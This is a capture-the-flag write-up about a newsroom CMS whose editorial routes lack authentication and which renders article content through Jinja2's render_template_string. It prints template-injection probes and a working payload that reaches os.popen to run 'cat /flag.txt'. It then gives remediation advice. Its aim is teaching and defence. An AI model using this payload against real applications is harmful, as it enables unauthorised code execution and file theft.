# Technical Write-Up: CMS Newsroom (Broken Access Control & Jinja2 SSTI to RCE)

## Challenge Specification

- **Target Application**: Newly migrated newsroom content management system (CMS).
- **Flaw Context**: Single Sign-On (SSO) authentication middleware was erroneously omitted from editorial management routes, allowing unauthenticated visitors to create and edit articles. Article content is evaluated by the server before...
- **Flag Location**: `/flag.txt`
- **Flag Format**: `InvataCyber{...}`

## Attack Surface Analysis & Root Cause

The challenge presents two chained vulnerabilities:

1. **Broken Access Control ([CWE-306](https://cwe.mitre.org/data/definitions/306.html))**:  
The editorial routes (`/edit/<id>`, `/new-post`) lack authentication decorators.
2. **Server-Side Template Injection ([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html))**:  
The backend improperly utilizes `render_template_string()` in Python Flask/Jinja2, concatenating user-controlled article content directly into the template string rather than passing it as a template context variable.

## Template Engine Fingerprinting

Submitting mathematical expression payloads into article content via `POST /edit/5`:
- **Initial Probe**: `{{ 7 * 7 }}`  
Viewing `GET /post/5` rendered: ```html <div class="post-content">49</div> ```
- **String Multiplication Probe**: `{{ 'a' * 3 }}`  
Rendered output: `aaa`.

This confirmed an active **Jinja2 / Python** templating engine without sandbox isolation.

## Sandbox Escape & Remote Code Execution (RCE)

In Jinja2 on Python 3, access to underlying Python objects is achievable via the method resolution order (`__mro__`):

1. Access base class:
```jinja2 {{ ''.__class__.__mro__[1] }} ```
2. Inspect available subclasses:
```jinja2 {{ ''.__class__.__mro__[1].__subclasses__() }} ```
3. Locate `subprocess.Popen` or `os.system` execution primitives to read `/flag.txt`:
```jinja2 {{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }} ```

## Automated Python Solver (`blog_flag.py`)

## Remediation & Hardening Recommendations

1. **Enforce Authentication Middleware**: Apply mandatory SSO/OAuth2-Proxy authentication wrappers across all administrative and editorial routes.
2. **Eliminate `render_template_string`**: Use static templates with explicit context parameter binding:
```python # SECURE: Pass content as variable, avoiding template code compilation return render_template('post.html', content=article.content) ```
3. **Sandboxed Template Execution**: If dynamic template rendering is required, utilize Jinja2 `SandboxedEnvironment` to restrict access to dangerous private attributes (`__class__`, `__mro__`, `__globals__`).
